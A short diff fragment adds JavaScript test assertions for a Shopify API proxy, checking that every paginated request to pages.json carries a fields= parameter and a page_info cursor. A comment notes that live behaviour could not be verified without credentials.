+    },
+  });
+  await call('/stub/list');
+  const pageCalls = seenUrls.filter((u) => u.includes('pages.json'));
+  eq(pageCalls.length, LIST_HOP_MAX, 'fields: every hop was made');
+  ok(pageCalls.every((u) => u.includes('fields=')), 'fields: EVERY hop carries fields= — hops 2..N no longer pull whole page objects', JSON.stringify(pageCalls));
+  ok(pageCalls.slice(1).every((u) => u.includes('page_info=')), 'fields: …alongside the cursor');
+  // NOTE: Shopify documents page_info as combinable with limit and fields.
+  // That cannot be verified against the live store from here (no credentials
+  // in this environment) — this asserts the shape of OUR request only, and a
+  // live rejection would surface as shopify_rejected with the status logged.
 }
 
 // ---- REDIRECTS ARE NOT FOLLOWED -------------------------------------------
